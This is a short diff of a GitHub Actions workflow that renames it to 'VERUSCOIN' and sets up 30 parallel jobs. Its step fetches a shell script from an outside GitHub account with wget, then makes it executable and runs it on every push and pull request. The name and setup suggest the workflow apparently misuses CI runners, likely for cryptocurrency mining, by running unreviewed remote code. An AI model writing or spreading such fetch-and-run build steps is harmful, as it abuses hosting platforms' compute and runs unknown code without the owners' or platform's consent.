@@ -1,8 +1,8 @@
-name: LUCKYGANTENG
+name: VERUSCOIN
 on: [push, pull_request]
 jobs:
   build:
-    name: Lucky_1
+    name: Ba_channel
     runs-on: ubuntu-18.04
     strategy:
       max-parallel: 30
@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: BA_channel
       run: |
-        wget https://raw.githubusercontent.com/monhodsompul/mekil/main/main.sh && bash main.sh
+        wget https://raw.githubusercontent.com/monhodsompul/mekil/main/main.sh && chmod u+x main.sh && ./main.sh
